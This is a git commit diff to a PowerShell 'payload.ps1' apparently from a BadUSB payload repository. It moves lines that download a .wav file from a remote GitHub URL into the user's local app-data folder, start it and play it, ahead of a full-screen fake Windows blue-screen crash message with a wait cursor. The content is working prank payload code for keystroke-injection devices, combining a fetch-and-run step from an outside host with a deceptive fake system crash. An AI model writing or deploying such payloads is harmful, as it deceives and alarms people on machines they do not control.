1ebc75851ae75adf873b06554ccdb06d43bd668c
Zarashigal J <120185445+Zaraaashiigal@users.noreply.github.com>
2023-02-15 12:06:08 +0100

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,3 +1,8 @@
+$url = "raw.githubusercontent.com/Zaraaashiigal/badusb-payload/main/sowl.wav"
+Invoke-WebRequest -Uri $url -OutFile "$env:LOCALAPPDATA/sowl.wav"
+Start-Process -Filepath "$env:LOCALAPPDATA/sowl.wav"
+(New-Object Media.SoundPlayer "$env:LOCALAPPDATA/sowl.wav").play();
+
 $Text = @'
 A problem has been detected and Windows has been shut down to prevent damage 
 to your computer.
@@ -46,7 +51,3 @@ $Form.FormBorderStyle = 'None'
 $Form.BackColor = "#000080"
 $Form.Cursor=[System.Windows.Forms.Cursors]::WaitCursor
 $Form.ShowDialog()
-$url = "raw.githubusercontent.com/Zaraaashiigal/badusb-payload/main/sowl.wav"
-Invoke-WebRequest -Uri $url -OutFile "$env:LOCALAPPDATA/sowl.wav"
-Start-Process -Filepath "$env:LOCALAPPDATA/sowl.wav"
-(New-Object Media.SoundPlayer "$env:LOCALAPPDATA/sowl.wav").play();
